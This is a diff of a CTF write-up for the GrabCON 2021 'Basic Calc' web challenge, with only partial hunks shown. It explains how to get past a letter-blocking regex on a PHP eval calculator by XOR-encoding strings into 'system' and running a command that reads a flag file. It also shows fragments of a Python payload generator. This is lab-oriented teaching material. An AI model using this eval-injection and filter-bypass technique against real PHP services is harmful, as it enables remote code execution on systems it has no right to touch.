@@ -4,10 +4,13 @@
 Ever used calc based on php?
 ## Solution
 First we open that web page
+
 ![enter image description here](https://raw.githubusercontent.com/vichhika/CTF-Writeup/main/GrabCON%20CTF%202021/Web/Basic%20Calc/figure_1.jpg)
+
 Look at the code, we need to bypass the condition that not match regex : ``[A-Za-z`]`` . Since ``eval — Evaluate a string as PHP code``, we can inject a strings to become a code execution.
 
 To bypass input above, we use a `XOR` technique. For example :
+
 ```php
 A XOR B = C
 B XOR C = D
@@ -24,6 +27,7 @@ B XOR C = D
  #ouput = system
 ?>
 ```
+
 So how can we know that output? So we decide to create a python script to convert ``strings to XOR code``
 or ``generate a xor code from strings``.
 
@@ -60,6 +64,7 @@ for code in string_code:
     obfuscated_code += "(%s)" % obfuscated[1:]
 print(''.join(["(\"%s\")" % i for i in string_code]) + '=' + obfuscated_code)
 ```
+
 Explain code above:
 
  1. suppose flagggg.txt location is at ``/`` directory. So we want php to execute code ``system("cat /flagggg.txt"``
